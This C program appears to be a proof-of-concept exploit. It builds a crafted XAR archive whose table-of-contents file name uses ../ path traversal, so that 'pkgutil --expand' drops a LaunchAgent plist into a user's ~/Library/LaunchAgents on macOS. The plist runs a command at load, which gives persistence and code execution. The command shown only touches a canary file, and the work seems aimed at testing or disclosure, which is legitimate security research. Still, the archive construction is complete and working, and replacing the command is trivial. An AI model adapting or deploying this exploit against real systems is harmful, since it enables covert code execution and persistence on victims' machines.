/*
 * build_xar_r41.c — Gate B fix: header written byte-by-byte (no struct padding)
 *
 * Target: pkgutil --expand writes plist to ~/Library/LaunchAgents/
 * via ../../../../../../Users/runner/Library/LaunchAgents/xar_gate_b.plist
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <zlib.h>
#include <CommonCrypto/CommonDigest.h>

static void write_u16be(uint8_t *b, uint16_t v){ b[0]=v>>8; b[1]=v&0xff; }
static void write_u32be(uint8_t *b, uint32_t v){ b[0]=v>>24;b[1]=(v>>16)&0xff;b[2]=(v>>8)&0xff;b[3]=v&0xff; }
static void write_u64be(uint8_t *b, uint64_t v){
    for(int i=0;i<8;i++) b[i]=(v>>(56-8*i))&0xff;
}

int main(int argc, char **argv){
    if(argc!=2){fprintf(stderr,"Usage: %s out.xar\n",argv[0]);return 1;}

    /* payload: a LaunchAgent plist that touches a canary file */
    const char *payload =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n"
        "  \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\">\n"
        "<dict>\n"
        "  <key>Label</key><string>com.xar.gate_b_canary</string>\n"
        "  <key>ProgramArguments</key>\n"
        "  <array><string>/usr/bin/touch</string>"
        "<string>/tmp/xar_gate_b_canary_macos.txt</string></array>\n"
        "  <key>RunAtLoad</key><true/>\n"
        "</dict>\n"
        "</plist>\n";
    size_t plen = strlen(payload);

    /* compress payload */
    uLongf czlen2 = compressBound((uLong)plen);
    unsigned char *cz2 = malloc(czlen2);
    if(compress(cz2,(uLongf*)&czlen2,(const Bytef*)payload,(uLong)plen)!=Z_OK){
        fprintf(stderr,"compress payload failed\n");return 1;
    }

    /* 6 levels of ../ from /tmp/<mktemp>/out → / → /Users/runner/Library/LaunchAgents/ */
    const char *fname =
        "../../../../../../Users/runner/Library/LaunchAgents/xar_gate_b.plist";

    /* TOC XML */
    char toc_xml[4096];
    int toc_len = snprintf(toc_xml, sizeof(toc_xml),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<xar><toc>"
        "<checksum style=\"sha1\"><offset>0</offset><size>20</size></checksum>"
        "<file id=\"1\">"
          "<name>%s</name>"
          "<type>file</type>"
          "<data>"
            "<offset>20</offset>"
            "<size>%zu</size>"
            "<length>%zu</length>"
            "<encoding style=\"application/x-gzip\"/>"
          "</data>"
        "</file>"
        "</toc></xar>\n",
        fname, plen, czlen2);

    /* compress TOC */
    uLongf toc_czlen = compressBound((uLong)toc_len);
    unsigned char *toc_cz = malloc(toc_czlen);
    if(compress(toc_cz,(uLongf*)&toc_czlen,(const Bytef*)toc_xml,(uLong)toc_len)!=Z_OK){
        fprintf(stderr,"compress TOC failed\n");return 1;
    }

    /* SHA1 of compressed TOC */
    unsigned char sha1[CC_SHA1_DIGEST_LENGTH];
    CC_SHA1(toc_cz,(CC_LONG)toc_czlen,sha1);

    /* heap = sha1(20 bytes) + compressed payload */
    size_t heap_len = 20 + czlen2;
    unsigned char *heap = malloc(heap_len);
    memcpy(heap, sha1, 20);
    memcpy(heap+20, cz2, czlen2);

    /* XAR header — 28 bytes, written byte-by-byte (no struct padding issues) */
    uint8_t hdr[28];
    write_u32be(hdr+0,  0x78617221u);   /* magic */
    write_u16be(hdr+4,  28);            /* header size */
    write_u16be(hdr+6,  1);             /* version */
    write_u64be(hdr+8,  toc_czlen);     /* toc compressed length */
    write_u64be(hdr+16, (uint64_t)toc_len); /* toc uncompressed length */
    write_u32be(hdr+24, 1);             /* checksum algorithm: SHA1 */

    FILE *f = fopen(argv[1],"wb");
    if(!f){perror("fopen");return 1;}
    fwrite(hdr, 28, 1, f);
    fwrite(toc_cz, 1, toc_czlen, f);
    fwrite(heap, 1, heap_len, f);
    fclose(f);

    fprintf(stderr,"Written: %s (hdr=28, TOC %zu bytes cz, payload %zu→%zu bytes)\n",
            argv[1],(size_t)toc_czlen,plen,(size_t)czlen2);
    free(toc_cz); free(cz2); free(heap);
    return 0;
}
